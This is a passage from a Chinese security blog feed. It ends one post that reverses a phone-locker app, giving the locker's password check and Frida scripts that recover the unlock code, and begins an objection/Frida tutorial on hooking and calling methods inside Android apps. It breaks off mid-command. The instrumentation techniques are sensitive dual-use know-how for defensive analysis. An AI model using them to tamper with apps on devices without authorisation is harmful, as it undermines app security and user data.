if(颜如玉QQ2693533893.hex_sha1(this.val$fuck.getText().toString()).equals(MyServiceOne.this.坐等前往世界的尽头的小船)) &#123;</span><br><span class="line">            MyServiceOne.this.util.removeView();</span><br><span class="line">            return;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        MyServiceOne.this.解锁.setVisibility(0);</span><br><span class="line">        MyServiceOne.this.解锁.setText(&quot;密码错误，手机恢复正常失败&#x2F;nManifest-Version: 1.0Created-By: 1.0 (Android SignApk)&quot;);</span><br><span class="line">        Runnable v6 &#x3D; MyServiceOne.this.runn3;</span><br><span class="line">        MyServiceOne.this.hand3.postDelayed(v6, 2000L);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>网盘链接已经失效，我们编写脚本给内存中变量<code>v0.this$0.坐等前往世界的尽头的小船</code>赋值即可解锁。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function Find_Code()&#123;</span><br><span class="line">    Java.perform(function()&#123;</span><br><span class="line">        console.log(&quot;Inside java perform&quot;);</span><br><span class="line">        var val &#x3D; &quot;123123&quot;;</span><br><span class="line">        var string_class &#x3D; Java.use(&quot;java.lang.String&quot;);</span><br><span class="line">        var flag &#x3D; Java.use(&quot;com.shimeng.颜如玉.颜如玉QQ2693533893&quot;).hex_sha1(string_class.$new(val));</span><br><span class="line">        Java.choose(&quot;com.shimeng.qq2693533893.MyServiceOne&quot;,&#123;</span><br><span class="line">            onMatch:function(instance)&#123;</span><br><span class="line">                instance.坐等前往世界的尽头的小船.value &#x3D; flag;</span><br><span class="line">            &#125;,onComplete:function()&#123;console.log(&quot;flag,value&quot;,flag,val);&#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[Android Emulator 5554::com.shimeng.qq2693533893]-&gt; Find_Code3()</span><br><span class="line">Inside java perform</span><br><span class="line">flag,value 601f1889667efaebb33b8c12572835da3f027f78 123123</span><br></pre></td></tr></table></figure><p>输入<code>123123</code> 即可解锁</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20230129125736432.png" alt="image-20230129125736432"></p><p>完整脚本</p><p>hook.js</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; String[] v4 &#x3D; &#123;&quot;0&quot;, &quot;1&quot;, &quot;2&quot;, &quot;3&quot;, &quot;4&quot;, &quot;5&quot;, &quot;6&quot;, &quot;7&quot;, &quot;8&quot;, &quot;9&quot;&#125;;</span><br><span class="line">&#x2F;&#x2F; String[] v5 &#x3D; &#123;&quot;嘻&quot;, &quot;❥&quot;, &quot;÷&quot;, &quot;∷&quot;, &quot;●&quot;, &quot;©&quot;, &quot;额&quot;, &quot;★&quot;, &quot;※&quot;, &quot;&#x2F;&quot;&#125;;</span><br><span class="line">function Find_Code1()&#123;</span><br><span class="line">    Java.perform(function()&#123;</span><br><span class="line">        var javaString &#x3D; Java.use(&#39;java.lang.String&#39;)</span><br><span class="line">        for(var j&#x3D;1;j&lt;1000;j++)&#123;</span><br><span class="line">            var j &#x3D; javaString.$new(String(j));</span><br><span class="line">            var v2_3 &#x3D; Java.use(&quot;com.shimeng.颜如玉.颜如玉QQ2693533893&quot;).getSaltMD5(Java.use(&quot;com.shimeng.qq2693533893.MyServiceOne&quot;).颜如玉(j));</span><br><span class="line">            &#x2F;&#x2F; console.log(&quot;l, v2_3:&quot;,j,v2_3);</span><br><span class="line">            if(v2_3 &#x3D;&#x3D; &#39;9DDEB743E935CE399F1DFAF080775366&#39;)&#123;</span><br><span class="line">                console.log(&quot;v2_3:&quot;,j);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">            var i &#x3D; javaString.$new(String(3744));</span><br><span class="line">            var Code &#x3D; Java.use(&quot;com.shimeng.颜如玉.颜如玉QQ2693533893&quot;).get(i);</span><br><span class="line">            var v3 &#x3D; Java.use(&quot;com.shimeng.qq2693533893.MyServiceOne&quot;).颜如玉(Java.use(&quot;com.shimeng.颜如玉.颜如玉QQ2693533893&quot;).getSaltMD5((javaString.$new(String(i^1288)))));</span><br><span class="line">            var v3 &#x3D; javaString.$new(v3).replaceAll(&quot;\\D+&quot;, &quot;&quot;);</span><br><span class="line">            var resu1 &#x3D; &quot;358&quot; + javaString.$new(v3).substring(0, 9);</span><br><span class="line">            console.log(&quot;i,Code,v3,resu1:&quot;,i,Code, v3, resu1);</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line">function Find_Code2()&#123;</span><br><span class="line">    Java.perform(function()&#123;</span><br><span class="line">        var javaString &#x3D; Java.use(&#39;java.lang.String&#39;)</span><br><span class="line">        for(var j&#x3D;1;j&lt;1000;j++)&#123;</span><br><span class="line">            var j &#x3D; javaString.$new(String(j));</span><br><span class="line">            var v2_3 &#x3D; Java.use(&quot;com.shimeng.颜如玉.颜如玉QQ2693533893&quot;).$new().getTwiceMD5ofString(Java.use(&quot;com.shimeng.颜如玉.颜如玉QQ2693533893&quot;).hex_sha1(j));</span><br><span class="line">            &#x2F;&#x2F;console.log(&quot;l, v2_3:&quot;,j,v2_3);</span><br><span class="line">            if(v2_3 &#x3D;&#x3D; &#39;8D4FF507DCDA63C201EB8B99D4170900&#39;)&#123;</span><br><span class="line">                console.log(&quot;v2_3:&quot;,j);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        var i &#x3D; javaString.$new(String(694));</span><br><span class="line">        var Code &#x3D; Java.use(&quot;com.shimeng.颜如玉.颜如玉QQ2693533893&quot;).get(i);</span><br><span class="line">        var v3 &#x3D; Java.use(&quot;com.shimeng.颜如玉.颜如玉QQ2693533893&quot;).hex_sha1(Java.use(&quot;com.shimeng.颜如玉.颜如玉QQ2693533893&quot;).$new().getTwiceMD5ofString(i));</span><br><span class="line">        var v3 &#x3D; javaString.$new(v3).replaceAll(&quot;\\D+&quot;, &quot;&quot;);</span><br><span class="line">        var resu2 &#x3D; &quot;694&quot; + javaString.$new(v3).substring(0, 9);</span><br><span class="line">        console.log(&quot;i,Code,v3,resu2&quot;,i,Code,v3,resu2)</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line">function Find_Code3()&#123;</span><br><span class="line">    Java.perform(function()&#123;</span><br><span class="line">        console.log(&quot;Inside java perform&quot;);</span><br><span class="line">        var val &#x3D; &quot;123123&quot;;</span><br><span class="line">        var string_class &#x3D; Java.use(&quot;java.lang.String&quot;);</span><br><span class="line">        var flag &#x3D; Java.use(&quot;com.shimeng.颜如玉.颜如玉QQ2693533893&quot;).hex_sha1(string_class.$new(val));</span><br><span class="line">        Java.choose(&quot;com.shimeng.qq2693533893.MyServiceOne&quot;,&#123;</span><br><span class="line">            onMatch:function(instance)&#123;</span><br><span class="line">                instance.坐等前往世界的尽头的小船.value &#x3D; flag;</span><br><span class="line">            &#125;,onComplete:function()&#123;console.log(&quot;flag,value&quot;,flag,val);&#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;接上篇，上篇对Objection的常用使用方法进行了总结，同时也找到两个APK进行练习测试。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;文章中使用的APK以及脚本可以在此处进行下载 &lt;a href=&quot;https://github.com/OL4THREE/Practice-Note&quot;&gt;Demo下载&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&quot;https://oss-map.oss-cn-beijing.aliyuncs.com/img/objection-20220704171740596.png&quot; alt=&quot;objection.png&quot;&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="Android" scheme="http://www.ol4three.com/categories/Android/"/>
    
    
      <category term="objection" scheme="http://www.ol4three.com/tags/objection/"/>
    
      <category term="junior" scheme="http://www.ol4three.com/tags/junior/"/>
    
  </entry>
  
  <entry>
    <title>objection 使用详解</title>
    <link href="http://www.ol4three.com/2022/03/11/Android/objection-%E4%BD%BF%E7%94%A8%E8%AF%A6%E8%A7%A3/"/>
    <id>http://www.ol4three.com/2022/03/11/Android/objection-%E4%BD%BF%E7%94%A8%E8%AF%A6%E8%A7%A3/</id>
    <published>2022-03-11T08:46:22.000Z</published>
    <updated>2023-01-29T06:17:32.733Z</updated>
    
    <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><blockquote><p>objection是一个基于Frida的动态的移动测试工具包，可以帮助我们来进行应用程序安全评估。</p><p>主要由以下三个组件组成</p><p>1.Frida-Gadget，以嵌入式模式运行应用，通过objection自己的api方法去调用frda执行我们想要的命令</p><p>2.objeciton本身是由python编写的可以通过python实现一个交互式shell进行命令的加载和使用，以此来调用objection</p><p>3.objection进行hook时会通过TypeScript独立生成一个agent.js文件，这样可以在使用中可以去直接调用所有的功能</p></blockquote><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/objection-20220704171740596.png" alt="objection.png"></p><a id="more"></a><p>首先挂一张图</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220715164700277.png" alt="image-20220715164700277"></p><h2 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 推荐兼容下载也可自行选择</span><br><span class="line">pip3 install frida&#x3D;&#x3D;5.3.0</span><br><span class="line">pip3 install frida&#x3D;&#x3D;12.8.0</span><br><span class="line">pip3 install objection&#x3D;&#x3D;1.8.4</span><br><span class="line"># 下载最新版本</span><br><span class="line">pip3 install --upgrade objection</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 测试环境</span><br><span class="line">Mac OS 12.3</span><br><span class="line">Kali 2022</span><br><span class="line">Nexus 6P</span><br><span class="line">MUMU模拟器</span><br></pre></td></tr></table></figure><h2 id="基础命令"><a href="#基础命令" class="headerlink" title="基础命令"></a>基础命令</h2><h3 id="查看环境任务"><a href="#查看环境任务" class="headerlink" title="查看环境任务"></a>查看环境任务</h3><h4 id="jobs"><a href="#jobs" class="headerlink" title="jobs"></a>jobs</h4><p>用于查看和管理当前Hook所执行的任务，可以同时运行多项hook作业。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">com.android.settings on (google: 6.0.1) [usb] # jobs list</span><br><span class="line">Job ID       Hooks  Type</span><br><span class="line">-----------  -----  ------------------------------------</span><br><span class="line">5tk3e403t35      4  watch-method for: java.io.File.$init</span><br></pre></td></tr></table></figure><h4 id="Frida命令"><a href="#Frida命令" class="headerlink" title="Frida命令"></a>Frida命令</h4><p>查看Frida相关信息</p><h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><h3 id="列出内存中的所有类"><a href="#列出内存中的所有类" class="headerlink" title="列出内存中的所有类"></a>列出内存中的所有类</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">android hooking list classes</span><br></pre></td></tr></table></figure><h3 id="内存中所有已加载的类中搜索包含关键词的类"><a href="#内存中所有已加载的类中搜索包含关键词的类" class="headerlink" title="内存中所有已加载的类中搜索包含关键词的类"></a>内存中所有已加载的类中搜索包含关键词的类</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">android hooking search classes</span><br><span class="line">eg: android hooking search classes display</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">com.android.settings on (google: 6.0.1) [usb] # android hooking search classes display</span><br><span class="line">[Landroid.icu.text.DisplayContext$Type;</span><br><span class="line">[Landroid.icu.text.DisplayContext;</span><br><span class="line">[Landroid.view.Display$ColorTransform;</span><br><span class="line">[Landroid.view.Display$Mode;</span><br><span class="line">android.hardware.display.DisplayManager</span><br><span class="line">android.hardware.display.DisplayManager$DisplayListener</span><br><span class="line">android.hardware.display.DisplayManagerGlobal</span><br><span class="line">android.hardware.display.DisplayManagerGlobal$DisplayListenerDelegate</span><br><span class="line">android.hardware.display.DisplayManagerGlobal$DisplayManagerCallback</span><br><span class="line">android.hardware.display.IDisplayManager</span><br><span class="line">android.hardware.display.IDisplayManager$Stub</span><br><span class="line">android.hardware.display.IDisplayManager$Stub$Proxy</span><br><span class="line">android.hardware.display.IDisplayManagerCallback</span><br><span class="line">android.hardware.display.IDisplayManagerCallback$Stub</span><br><span class="line">android.icu.impl.CurrencyData$CurrencyDisplayInfo</span><br><span class="line">android.icu.impl.CurrencyData$CurrencyDisplayInfoProvider</span><br><span class="line">android.icu.impl.ICUCurrencyDisplayInfoProvider</span><br><span class="line">android.icu.impl.ICUCurrencyDisplayInfoProvider$ICUCurrencyDisplayInfo</span><br><span class="line">android.icu.text.CurrencyDisplayNames</span><br><span class="line">android.icu.text.DisplayContext</span><br><span class="line">android.icu.text.DisplayContext$Type</span><br><span class="line">android.media.RemoteDisplay</span><br><span class="line">android.opengl.EGLDisplay</span><br><span class="line">android.util.DisplayMetrics</span><br><span class="line">android.view.Choreographer$FrameDisplayEventReceiver</span><br><span class="line">android.view.Display</span><br><span class="line">android.view.Display$ColorTransform</span><br><span class="line">android.view.Display$ColorTransform$1</span><br><span class="line">android.view.Display$Mode</span><br><span class="line">android.view.Display$Mode$1</span><br><span class="line">android.view.DisplayAdjustments</span><br><span class="line">android.view.DisplayEventReceiver</span><br><span class="line">android.view.DisplayInfo</span><br><span class="line">android.view.DisplayInfo$1</span><br><span class="line">android.view.DisplayListCanvas</span><br><span class="line">android.view.SurfaceControl$PhysicalDisplayInfo</span><br><span class="line">com.android.settings.DisplaySettings</span><br><span class="line">com.android.settings.wfd.WifiDisplaySettings</span><br><span class="line">com.google.android.gles_jni.EGLDisplayImpl</span><br><span class="line">javax.microedition.khronos.egl.EGLDisplay</span><br><span class="line"></span><br><span class="line">Found 40 classes</span><br></pre></td></tr></table></figure><h3 id="内存中搜索所有包含关键词key的方法"><a href="#内存中搜索所有包含关键词key的方法" class="headerlink" title="内存中搜索所有包含关键词key的方法"></a>内存中搜索所有包含关键词key的方法</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">android hooking search methods &lt;keys&gt;</span><br><span class="line">eg:android hooking search methods dispaly</span><br></pre></td></tr></table></figure><h3 id="列出类的所有方法"><a href="#列出类的所有方法" class="headerlink" title="列出类的所有方法"></a>列出类的所有方法</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">android hooking list class_methods</span><br><span class="line">android hooking list class_methods &lt;class&gt;</span><br><span class="line">android hooking list class_methods android.hardware disapaly.DisplayManager</span><br></pre></td></tr></table></figure><h3 id="列出进程中所有的activity"><a href="#列出进程中所有的activity" class="headerlink" title="列出进程中所有的activity"></a>列出进程中所有的activity</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">android hooking list activities</span><br></pre></td></tr></table></figure><h3 id="列出进程中所有的service"><a href="#列出进程中所有的service" class="headerlink" title="列出进程中所有的service"></a>列出进程中所有的service</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">android hook list services</span><br></pre></td></tr></table></figure><h3 id="列出进程中所有的广播接收器"><a href="#列出进程中所有的广播接收器" class="headerlink" title="列出进程中所有的广播接收器"></a>列出进程中所有的广播接收器</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">android hooking list receivers</span><br></pre></td></tr></table></figure><h3 id="列出进程中所有的内容提供者"><a href="#列出进程中所有的内容提供者" class="headerlink" title="列出进程中所有的内容提供者"></a>列出进程中所有的内容提供者</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">android hooking list providers</span><br></pre></td></tr></table></figure><h3 id="对指定的方法进行hook"><a href="#对指定的方法进行hook" class="headerlink" title="对指定的方法进行hook"></a>对指定的方法进行hook</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">android hooking watch class_method &lt;method_Name&gt;</span><br><span class="line">android hooking watch class java.io.File</span><br><span class="line">com.android.settings on (google: 6.0.1) [usb] # jobs list</span><br><span class="line">Job ID       Hooks  Type</span><br><span class="line">-----------  -----  -----------------------------</span><br><span class="line">nenk6ks64jg     64  watch-class for: java.io.File</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">android hooking watch class_method java.io.File.$init --dump-args --dump-backtrace --dump-return</span><br><span class="line">--dump-args                               &#x2F;&#x2F;打印函数的参数</span><br><span class="line">--dump-backtrace                          &#x2F;&#x2F;调用栈</span><br><span class="line">--dump-return                             &#x2F;&#x2F;返回值</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">com.android.settings on (google: 6.0.1) [usb] # android hooking watch class_method java.io.File.$init --dump-args --dump-backtrace --dump-return</span><br><span class="line">(agent) Attempting to watch class java.io.File and method $init.</span><br><span class="line">(agent) Hooking java.io.File.$init(java.io.File, java.lang.String)</span><br><span class="line">(agent) Hooking java.io.File.$init(java.lang.String)</span><br><span class="line">(agent) Hooking java.io.File.$init(java.lang.String, java.lang.String)</span><br><span class="line">(agent) Hooking java.io.File.$init(java.net.URI)</span><br><span class="line">(agent) Registering job 5tk3e403t35. Type: watch-method for: java.io.File.$init</span><br></pre></td></tr></table></figure><blockquote><p>虽然只确定了Hook构造，但是默认会Hook对应方法的所有重载。同时，在输出的最后一行显示<strong>Registering job 5tk3e403t35</strong>，表示这个Hook被作为一个任务被添加。</p></blockquote><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">com.android.settings on (google: 6.0.1) [usb] # jobs list</span><br><span class="line">Job ID       Hooks  Type</span><br><span class="line">-----------  -----  ------------------------------------</span><br><span class="line">5tk3e403t35      4  watch-method for: java.io.File.$init</span><br></pre></td></tr></table></figure><p>在“设置”应用中的任意位置进行点击时，会发现java.ioFile.File(java.io.lang.String)这一个函数被调用了。在Backtrace之后打印的调用栈中，我们可以清楚的看到这个构造函数的调用来源</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(agent) [5tk3e403t35] Called java.io.File.File(java.lang.String)</span><br><span class="line">(agent) [5tk3e403t35] Backtrace:</span><br><span class="line">java.io.File.&lt;init&gt;(Native Method)</span><br><span class="line">android.content.res.XResources.isFirstLoad(XResources.java:115)</span><br><span class="line">de.robv.android.xposed.XposedInit.cloneToXResources(XposedInit.java:396)</span><br><span class="line">de.robv.android.xposed.XposedInit.access$100(XposedInit.java:63)</span><br><span class="line">de.robv.android.xposed.XposedInit$9.afterHookedMethod(XposedInit.java:326)</span><br><span class="line">de.robv.android.xposed.XposedBridge.handleHookedMethod(XposedBridge.java:374)</span><br><span class="line">android.app.ResourcesManager.getTopLevelResources(&lt;Xposed&gt;)</span><br><span class="line">android.app.ActivityThread.getTopLevelResources(ActivityThread.java:1701)</span><br><span class="line">android.app.ApplicationPackageManager.getResourcesForApplication(ApplicationPackageManager.java:1032)</span><br><span class="line">de.robv.android.xposed.XposedBridge.invokeOriginalMethodNative(Native Method)</span><br><span class="line">de.robv.android.xposed.XposedBridge.handleHookedMethod(XposedBridge.java:360)</span><br><span class="line">android.app.ApplicationPackageManager.getResourcesForApplication(&lt;Xposed&gt;)</span><br><span class="line">android.app.ApplicationPackageManager.getText(ApplicationPackageManager.java:1286)</span><br><span class="line">android.content.pm.ComponentInfo.loadLabel(ComponentInfo.java:85)</span><br><span class="line">com.android.settings.DreamBackend.getActiveDreamName(DreamBackend.java:136)</span><br><span class="line">com.android.settings.DreamSettings.getSummaryTextWithDreamName(DreamSettings.java:261)</span><br><span class="line">com.android.settings.DisplaySettings.updateScreenSaverSummary(DisplaySettings.java:425)</span><br><span class="line">com.android.settings.DisplaySettings.updateState(DisplaySettings.java:381)</span><br><span class="line">com.android.settings.DisplaySettings.onResume(DisplaySettings.java:362)</span><br><span class="line">android.app.Fragment.performResume(Fragment.java:2263)</span><br><span class="line">android.app.FragmentManagerImpl.moveToState(FragmentManager.java:1008)</span><br><span class="line">android.app.FragmentManagerImpl.moveToState(FragmentManager.java:1148)</span><br><span class="line">android.app.FragmentManagerImpl.moveToState(FragmentManager.java:1130)</span><br><span class="line">android.app.FragmentManagerImpl.dispatchResume(FragmentManager.java:1963)</span><br><span class="line">android.app.FragmentController.dispatchResume(FragmentController.java:174)</span><br><span class="line">android.app.Activity.performResume(Activity.java:6348)</span><br><span class="line">android.app.ActivityThread.performResumeActivity(ActivityThread.java:3092)</span><br><span class="line">android.app.ActivityThread.handleResumeActivity(ActivityThread.java:3134)</span><br><span class="line">android.app.ActivityThread.handleLaunchActivity(ActivityThread.java:2481)</span><br><span class="line">android.app.ActivityThread.-wrap11(ActivityThread.java)</span><br><span class="line">android.app.ActivityThread$H.handleMessage(ActivityThread.java:1344)</span><br><span class="line">android.os.Handler.dispatchMessage(Handler.java:102)</span><br><span class="line">android.os.Looper.loop(Looper.java:148)</span><br><span class="line">android.app.ActivityThread.main(ActivityThread.java:5417)</span><br><span class="line">java.lang.reflect.Method.invoke(Native Method)</span><br><span class="line">com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:726)</span><br><span class="line">com.android.internal.os.ZygoteInit.main(ZygoteInit.java:616)</span><br><span class="line">de.robv.android.xposed.XposedBridge.main(XposedBridge.java:107)</span><br><span class="line"></span><br><span class="line">(agent) [5tk3e403t35] Arguments java.io.File.File(&#x2F;data&#x2F;app&#x2F;com.google.android.deskclock-1&#x2F;base.apk)</span><br><span class="line">(agent) [5tk3e403t35] Return Value: (none)</span><br></pre></td></tr></table></figure><p>测试结束后，可以根据作业的ID来删除作业，取消对这些函数的Hook，最终执行结果如下</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">com.android.settings on (google: 6.0.1) [usb] # jobs list</span><br><span class="line">Job ID       Hooks  Type</span><br><span class="line">-----------  -----  ------------------------------------</span><br><span class="line">5tk3e403t35      4  watch-method for: java.io.File.$init</span><br><span class="line">com.android.settings on (google: 6.0.1) [usb] # jobs kill 5tk3e403t35</span><br><span class="line">com.android.settings on (google: 6.0.1) [usb] # jobs list</span><br><span class="line">Job ID  Hooks  Type</span><br><span class="line">------  -----  ----</span><br></pre></td></tr></table></figure><h3 id="主动调用"><a href="#主动调用" class="headerlink" title="主动调用"></a>主动调用</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">android heap search instances &lt;classname&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">android heap search instances java.io.File</span><br><span class="line">Class instance enumeration complete for java.io.File</span><br><span class="line">Handle    Class         toString()</span><br><span class="line">--------  ------------  ---------------------------------------------------------------------------------------</span><br><span class="line">0x200d26  java.io.File  &#x2F;data&#x2F;app&#x2F;com.google.android.gms-1&#x2F;base.apk</span><br><span class="line">0x200d2a  java.io.File  &#x2F;data&#x2F;user&#x2F;0&#x2F;com.android.settings&#x2F;shared_prefs</span><br><span class="line">0x200d2e  java.io.File  &#x2F;data&#x2F;user&#x2F;0&#x2F;com.android.settings&#x2F;shared_prefs&#x2F;com.android.settings_preferences.xml</span><br><span class="line">0x200d32  java.io.File  &#x2F;data&#x2F;user&#x2F;0&#x2F;com.android.settings&#x2F;shared_prefs&#x2F;com.android.settings_preferences.xml.bak</span><br><span class="line">0x100d36  java.io.File  &#x2F;data&#x2F;app&#x2F;com.google.android.deskclock-1&#x2F;base.apk</span><br><span class="line">0x100d3a  java.io.File  &#x2F;data&#x2F;misc&#x2F;keychain&#x2F;cacerts-added</span><br><span class="line">0x100d3e  java.io.File  &#x2F;data&#x2F;misc&#x2F;keychain&#x2F;cacerts-removed</span><br><span class="line">0x100d42  java.io.File  &#x2F;system&#x2F;etc&#x2F;security&#x2F;cacerts</span><br><span class="line">0x100d46  java.io.File  &#x2F;data</span><br><span class="line">0x100d4a  java.io.File  &#x2F;data</span><br><span class="line">0x100d4e  java.io.File  &#x2F;system</span><br><span class="line">0x100d52  java.io.File  &#x2F;storage</span><br><span class="line">0x100d56  java.io.File  &#x2F;oem</span><br><span class="line">0x100d5a  java.io.File  &#x2F;vendor</span><br><span class="line">0x100d5e  java.io.File  &#x2F;cache</span><br><span class="line">0x100d62  java.io.File  &#x2F;data&#x2F;secure</span><br><span class="line">0x100d66  java.io.File  &#x2F;vendor&#x2F;lib64</span><br><span class="line">0x100d6a  java.io.File  &#x2F;system&#x2F;lib64</span><br><span class="line">0x100d6e  java.io.File</span><br><span class="line">0x100d72  java.io.File  &#x2F;data&#x2F;app&#x2F;mobi.acpm.inspeckage-1&#x2F;base.apk</span><br><span class="line">0x100d76  java.io.File  &#x2F;vendor&#x2F;lib64</span><br><span class="line">0x100d7a  java.io.File  &#x2F;system&#x2F;lib64</span><br><span class="line">0x100d7e  java.io.File</span><br><span class="line">0x100d82  java.io.File</span><br><span class="line">0x100d86  java.io.File  &#x2F;data&#x2F;data&#x2F;mobi.acpm.sslunpinning&#x2F;shared_prefs&#x2F;UnpinningPrefs.xml</span><br><span class="line">0x100d8a  java.io.File  &#x2F;vendor&#x2F;lib64</span><br><span class="line">0x100d8e  java.io.File  &#x2F;system&#x2F;lib64</span><br><span class="line">0x100d92  java.io.File</span><br><span class="line">0x100d96  java.io.File  &#x2F;data&#x2F;app&#x2F;mobi.acpm.sslunpinning-1&#x2F;base.apk</span><br><span class="line">0x100d9a  java.io.File  &#x2F;data&#x2F;data&#x2F;mobi.acpm.inspeckage&#x2F;shared_prefs&#x2F;InspeckagePrefs.xml</span><br><span class="line">0x100d9e  java.io.File  &#x2F;vendor&#x2F;lib64</span><br><span class="line">0x100da2  java.io.File  &#x2F;system&#x2F;lib64</span><br><span class="line">0x100da6  java.io.File</span><br><span class="line">0x100daa  java.io.File  &#x2F;data&#x2F;app&#x2F;just.trust.me-1&#x2F;base.apk</span><br><span class="line">0x100dae  java.io.File  &#x2F;data&#x2F;dalvik-cache</span><br><span class="line">0x100db2  java.io.File  &#x2F;vendor&#x2F;lib64</span><br><span class="line">0x100db6  java.io.File  &#x2F;system&#x2F;lib64</span><br><span class="line">0x100dba  java.io.File</span><br><span class="line">0x100dbe  java.io.File  &#x2F;system&#x2F;framework&#x2F;XposedBridge.jar</span><br><span class="line">0x100dc2  java.io.File  &#x2F;data&#x2F;misc&#x2F;user&#x2F;0</span><br><span class="line">0x100dc6  java.io.File  &#x2F;data&#x2F;misc&#x2F;user&#x2F;0&#x2F;cacerts-added</span><br><span class="line">0x100dca  java.io.File  &#x2F;data&#x2F;misc&#x2F;user&#x2F;0&#x2F;cacerts-removed</span><br><span class="line">0x100dce  java.io.File  &#x2F;data&#x2F;user&#x2F;0&#x2F;com.android.settings&#x2F;shared_prefs&#x2F;home_prefs.xml.bak</span><br><span class="line">0x100dd2  java.io.File  &#x2F;data&#x2F;user&#x2F;0&#x2F;com.android.settings&#x2F;shared_prefs&#x2F;home_prefs.xml</span><br><span class="line">0x100dd6  java.io.File  &#x2F;data&#x2F;user&#x2F;0&#x2F;com.android.settings&#x2F;shared_prefs&#x2F;development.xml.bak</span><br><span class="line">0x100dda  java.io.File  &#x2F;data&#x2F;user&#x2F;0&#x2F;com.android.settings&#x2F;shared_prefs&#x2F;development.xml</span><br><span class="line">0x100dde  java.io.File  &#x2F;data&#x2F;user&#x2F;0&#x2F;com.android.settings&#x2F;files</span><br><span class="line">0x100de2  java.io.File  &#x2F;data&#x2F;user&#x2F;0&#x2F;com.android.settings&#x2F;shared_prefs</span><br><span class="line">0x100de6  java.io.File  &#x2F;data&#x2F;user&#x2F;0&#x2F;com.android.settings&#x2F;cache</span><br><span class="line">0x100dea  java.io.File  &#x2F;data&#x2F;user&#x2F;0&#x2F;com.android.settings&#x2F;databases</span><br><span class="line">0x100dee  java.io.File  &#x2F;data&#x2F;user&#x2F;0&#x2F;com.android.settings</span><br><span class="line">0x100df2  java.io.File  &#x2F;</span><br><span class="line">0x100df6  java.io.File  &#x2F;data&#x2F;data&#x2F;com.android.settings&#x2F;cache</span><br><span class="line">0x100dfa  java.io.File  &#x2F;vendor&#x2F;lib64</span><br><span class="line">0x100dfe  java.io.File  &#x2F;system&#x2F;lib64</span><br><span class="line">0x100e02  java.io.File  lib&#x2F;arm64-v8a</span><br><span class="line">0x100e06  java.io.File  &#x2F;system&#x2F;priv-app&#x2F;Settings&#x2F;Settings.apk</span><br><span class="line">0x100e0a  java.io.File  &#x2F;system&#x2F;priv-app&#x2F;Settings&#x2F;lib&#x2F;arm64</span><br><span class="line">0x100e0e  java.io.File  &#x2F;system&#x2F;priv-app&#x2F;Settings&#x2F;Settings.apk!&#x2F;lib&#x2F;arm64-v8a</span><br><span class="line">0x100e12  java.io.File</span><br><span class="line">0x100e16  java.io.File  &#x2F;system&#x2F;priv-app&#x2F;Settings&#x2F;Settings.apk</span><br></pre></td></tr></table></figure><h3 id="调用实例方法"><a href="#调用实例方法" class="headerlink" title="调用实例方法"></a>调用实例方法</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">android heap execute &lt;Handle&gt; &lt;methodname&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">com.android.settings on (google: 6.0.1) [usb] # android heap execute 0x200d2e getPath</span><br><span class="line">Handle 0x200d2e is to class java.io.File</span><br><span class="line">Executing method: getPath()</span><br><span class="line">&#x2F;data&#x2F;user&#x2F;0&#x2F;com.android.settings&#x2F;shared_prefs&#x2F;com.android.settings_preferences.xml</span><br></pre></td></tr></table></figure><p>使用execute执行带参数时会报错</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">com.android.settings on (google: 6.0.1) [usb] # android heap execute 0x200d2e setExecutable True</span><br><span class="line">Handle 